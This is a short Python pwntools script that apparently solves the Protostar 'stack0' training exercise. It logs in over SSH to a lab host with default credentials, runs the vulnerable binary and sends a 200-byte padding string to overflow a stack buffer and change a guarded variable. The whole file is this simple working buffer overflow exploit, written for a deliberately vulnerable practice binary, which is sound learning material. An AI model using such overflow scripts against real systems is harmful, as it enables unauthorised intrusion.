#!/usr/bin/env python

import time
from pwn import *

level = 0
host = "10.168.142.133"
user = "user"
chal = "stack%i" % level
password  = "user"
binary   = "/opt/protostar/bin/%s" % chal
shell = ssh(host=host, user=user, password=password)

padding = "A" * 200

r = shell.run(binary)
r.sendline(padding)
r.recvuntil("you have changed the 'modified' variable")
r.clean()

log.success("Done!")
